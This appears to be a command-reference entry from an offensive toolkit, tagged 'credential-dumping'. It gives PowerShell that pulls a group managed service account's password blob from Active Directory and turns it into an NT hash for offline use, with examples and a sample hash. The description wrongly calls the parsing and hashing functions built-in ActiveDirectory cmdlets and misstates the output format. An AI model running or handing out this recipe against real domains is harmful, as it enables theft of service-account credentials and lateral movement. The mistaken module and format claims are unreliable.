---
type: command
executor: powershell
data: >-
  $gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties
  'msDS-ManagedPassword'

  $blob = $gmsa.'msDS-ManagedPassword'

  $mp = ConvertFrom-ADManagedPasswordBlob $blob

  $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword
tags:
  - credential-dumping
  - decryption
  - active-directory
platforms:
  - Windows
verified: true
validated: true
---

# Convert AD Managed Password Blob to NT Hash

## Command

```powershell
$gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```

## Description

This multi-line PowerShell command retrieves the managed password blob for a GMSA from Active Directory, parses it, and converts the secure password to an NT hash. It uses built-in ActiveDirectory cmdlets and requires the module to be imported. Ideal for offline hash extraction when you have the blob or direct AD access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-Identity` | The name of the GMSA (e.g., 'SVC_SERVICE_ACCOUNT') | Yes |
| `-Properties` | Specifies 'msDS-ManagedPassword' to include the blob | Yes |
| `$mp.SecureCurrentPassword` | The decrypted password from the blob (handled internally) | No (internal) |

## Examples

### Basic Usage

```powershell
$gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword
Write-Output $hash1
```

### Advanced Usage

Import module first: `Import-Module ActiveDirectory`

## Expected Output

```
aad3b435b51404eeaad3b435b51404ee:5ebbc37e032d683f0242e48aa40e46ed
```

The output is the NT hash in LM:NT format (LM is null). Use `Write-Output $hash1` to display it. Errors if AD module missing or access denied.

## Related

- [[procedures/extract-gmsa-passwords-from-active-directory]]
